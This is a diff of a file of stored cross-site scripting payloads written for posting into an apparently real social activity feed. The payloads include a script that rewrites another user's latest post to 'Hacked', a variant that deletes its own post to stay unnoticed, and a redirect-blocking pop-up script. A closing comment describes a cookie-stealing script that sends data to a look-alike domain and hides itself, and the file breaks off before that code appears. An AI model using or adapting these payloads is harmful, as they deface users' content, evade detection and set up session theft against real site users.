@@ -1,20 +1,20 @@
-<!--First test:-->
+<!-- (1) First test: -->
 <script> function x() {alert(1);} window. addEventListener ("load", x)</script>
 
-<!--Changing last feed:-->
+<!-- (2) Changing last feed: -->
 <script> function x() {let feeds = document. getElementsByClassName ( "activity_feed_content_status" );let lf = feeds[feeds.length - 1]; lf.innerText = "Hacked"} window. addEventListener ("load", x)</script>
 
 
-<!--Deleting myself to be more subtle:-->
+<!-- (3) Deleting myself to be more subtle: -->
 Some very long text. It does not matter what it is, but we don't want script to be split in half by "View more" span. We need to modify our script because it seems that escaping is better handled when text is split. We will use Array(...x).at(-1) instead of x[x.length - 1]. At the end of function x, we set x = undefined, just to clean more after us. This function fails if there are no other posts(it rewrites itself), it is deliberate so that I can delete this post if I want. Text in script in "innerHTML.includes()" can be arbitrary random text (it's better if it does not appear elsewhere on page).  <script> function x() {let feeds = document. getElementsByClassName ( "activity_feed_content_status" );let lf = Array(...feeds).at(-1); lf.innerText = "Hacked"; for(let elem of document. getElementsByClassName ( "js_feed_view_more_entry_holder" )) {if(elem. innerHTML. includes ( "bhdfjbdausvuth" )) {elem.remove();}} x=undefined} window. addEventListener ("load", x)</script>
 
 
-<!-- Script that disallows redirects after user interaction. (Making life better for others.) -->
+<!-- (4) Script that disallows redirects after user interaction. (Making life better for others.) -->
 Again some long text... aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa aaaaaaaaa  <script> alert("Open developer console(CTRL + SHIFT + I) and type 1 to console to enable pop-up asking before redirect"); alert("Open developer console(CTRL + SHIFT + I) and type 1 to console to enable pop-up asking before redirect"); window. onbeforeunload = function _before_unl (event) { event. preventDefault(); return "Try redirecting now HAHA."; }</script>
 
 
 <!--
-Script for collecting cookies.
+(5) Script for collecting cookies.
 Oracle VM server collecting POST request data on bek.fit-cvut.cz,
 similar domain means it can be missed when monitoring network traffic.
 Post again deletes itself to avoid detection.
